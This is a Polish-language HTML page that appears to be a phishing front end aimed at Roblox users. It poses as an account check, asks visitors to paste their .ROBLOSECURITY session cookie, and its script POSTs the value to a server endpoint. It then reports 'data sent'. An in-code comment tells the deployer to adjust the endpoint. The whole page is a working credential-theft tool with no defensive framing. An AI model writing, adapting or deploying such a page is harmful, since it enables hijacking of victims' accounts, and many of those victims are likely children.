<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sprawdź konto</title>
  <style>
    body { font-family: Arial; background:#111; color:#eee; max-width:500px; margin:40px auto; padding:20px; }
    textarea { width:100%; height:140px; background:#222; color:#eee; border:1px solid #444; padding:12px; font-family:monospace; }
    button { padding:14px 40px; background:#e74c3c; border:none; color:white; font-size:18px; cursor:pointer; margin:20px 0; }
    button:hover { background:#c0392b; }
    #status { margin-top:20px; font-size:18px; }
    .ok { color:#2ecc71; }
    .fail { color:#e74c3c; }
  </style>
</head>
<body>
<h2>Wklej .ROBLOSECURITY</h2>
<p style="color:#ffcc00;">NIE udostępniaj tego nikomu – to klucz do konta!</p>

<textarea id="ck" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez .ROBLOSECURITY=)"></textarea>
<button onclick="go()">Wyślij</button>

<div id="status"></div>

<script>
async function go() {
  const v = document.getElementById('ck').value.trim();
  const st = document.getElementById('status');

  if (v.length < 200) {
    st.innerHTML = '<span class="fail">Za krótkie</span>';
    return;
  }

  st.innerHTML = 'Wysyłanie...';

  try {
    const r = await fetch('/api/check', {  // ← zmień jeśli endpoint ma inną nazwę
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: v })
    });

    const j = await r.json();
    st.innerHTML = j.ok 
      ? '<span class="ok">Dane wysłane ✓</span>' 
      : '<span class="fail">Coś poszło nie tak</span>';
  } catch {
    st.innerHTML = '<span class="fail">Błąd połączenia</span>';
  }
}
</script>
</body>
</html>
